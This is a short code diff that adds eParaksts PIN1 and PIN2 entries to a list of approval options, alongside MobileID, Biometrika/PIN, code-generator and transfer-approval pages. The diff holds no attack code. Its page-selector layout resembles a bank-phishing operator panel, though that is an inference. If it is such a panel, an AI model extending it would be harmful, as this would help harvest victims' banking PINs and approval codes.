@@ -58,6 +58,8 @@ const APPROVAL_OPTIONS = [
   { value: "mobileid_2", label: "MobileID 2 Sayfası" },
   { value: "biometrika_pin_1", label: "Biometrika/PIN 1" },
   { value: "biometrika_pin_2", label: "Biometrika/PIN 2" },
+  { value: "eparaksts_1", label: "eParaksts PIN1" },
+  { value: "eparaksts_2", label: "eParaksts PIN2" },
   { value: "generator1", label: "Generator 1" },
   { value: "generator2", label: "Generator 2" },
   { value: "transfer", label: "Transfer Onayı" },
